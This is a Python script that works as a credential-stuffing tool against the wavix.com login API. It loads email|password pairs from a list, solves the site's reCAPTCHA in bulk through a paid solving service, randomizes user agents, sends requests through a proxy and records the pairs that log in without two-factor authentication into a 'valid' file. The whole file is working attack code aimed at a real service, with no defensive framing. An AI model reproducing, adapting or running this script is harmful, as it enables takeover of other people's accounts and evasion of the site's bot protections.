import time

import requests

import sys
import os
from threading import Thread
from fake_useragent import UserAgent

ua = UserAgent()

sys.path.append(os.path.dirname(os.path.dirname(os.path.realpath(__file__))))

from twocaptcha import TwoCaptcha

solver = TwoCaptcha('')

all_recaptcha_tokens = []

headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://wavix.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://wavix.com/',
    'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
}


def solve_recaptcha(sitekey, url):
    try:
        result = solver.recaptcha(sitekey=sitekey, url=url)
        print(f"Solved reCAPTCHA: {len(all_recaptcha_tokens)}")
        all_recaptcha_tokens.append(result['code'])
        open("recaptcha_tokens.txt", "a", encoding="utf-8").write(result['code'] + "\n")
    except Exception as e:
        print(f"Error solving reCAPTCHA: {e}")

valid_user=[]
with open('wavixcom_users.txt', 'r', encoding='utf-8') as f:
    reads_file = f.read().splitlines()
    for i in reads_file:
        email, password = i.split('|')
        if not "@" in email or not password:
            # print(f"Skipping invalid line: {i}")
            continue
        valid_user.append((email.strip(), password.strip()))
        
print(f'{len(valid_user)} valid users found.')
for i in range(len(valid_user)):
# for i in range(1):
    Thread(target=solve_recaptcha, args=('6Lc9QbkqAAAAAKovlw5yekyHK1KxLbM2t0AEsnPZ', 'https://wavix.com/sign-in') , daemon=True).start()

proxy_url = ''
proxies = {
  'http': proxy_url,
  'https': proxy_url
}
def login_and_fetch(x, email, password):
   
    while not all_recaptcha_tokens:
        for i in range(10):
            if all_recaptcha_tokens:
                break
            print(f"[{i+1}/10] Waiting for reCAPTCHA token... {len(all_recaptcha_tokens)}", end='\r')
            time.sleep(1)
    recaptcha_tokens =all_recaptcha_tokens.pop()
    headers['user-agent'] = ua.random
    json_data = {
        'email': email,
        'password': password,
        'two_fa': '',
        'recaptcha_token': recaptcha_tokens,
    }
    response = requests.post('https://app.wavix.com/api/site/v1/auth', headers=headers, json=json_data, proxies=proxies)
    print(response.text)
    open("responses.txt", "a", encoding="utf-8").write(f'{email}|{password} - {response.text}\n')
    if 'success":true' in response.text:
        if 'two_fa_auth":true' in response.text:
            print(f'{x} {email}|{password} - 2FA required')
        else:
            with open("wavixcom_users_valid.txt", "a", encoding="utf-8") as f:
                f.write(f'{email}|{password}\n')
    

for x, (email, password) in enumerate(valid_user, start=1):
    print(f'{x} {email}|{password}')
    login_and_fetch(x, email, password)
